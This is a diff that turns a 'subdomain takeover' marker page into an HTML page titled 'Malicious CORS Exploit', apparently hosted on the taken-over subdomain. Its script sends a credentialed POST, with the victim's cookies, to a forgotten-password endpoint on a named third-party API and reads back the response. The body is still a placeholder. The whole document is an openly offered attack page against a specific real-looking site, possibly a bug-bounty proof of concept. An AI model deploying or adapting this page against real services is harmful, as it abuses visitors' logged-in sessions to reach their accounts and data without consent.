@@ -1,1 +1,28 @@
-<h1> subdomain takeover by me <h1>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Malicious CORS Exploit</title>
+    <script>
+        // Attempting to exploit the CORS vulnerability
+        fetch('https://api.niceonesa.com/?route=rest/forgotten/forgotten', {
+            method: 'POST',
+            credentials: 'include', // Include cookies and HTTP auth
+            headers: {
+                'Content-Type': 'application/json',
+                // Include any necessary headers here
+            },
+            body: JSON.stringify({
+                // Payload data based on the API's requirements
+                exampleField: 'exampleValue'
+            })
+        })
+        .then(response => response.json())
+        .then(data => console.log('Response:', data))
+        .catch(error => console.error('Error:', error));
+    </script>
+</head>
+<body>
+    <h1>Malicious CORS Exploit</h1>
+</body>
+</html>
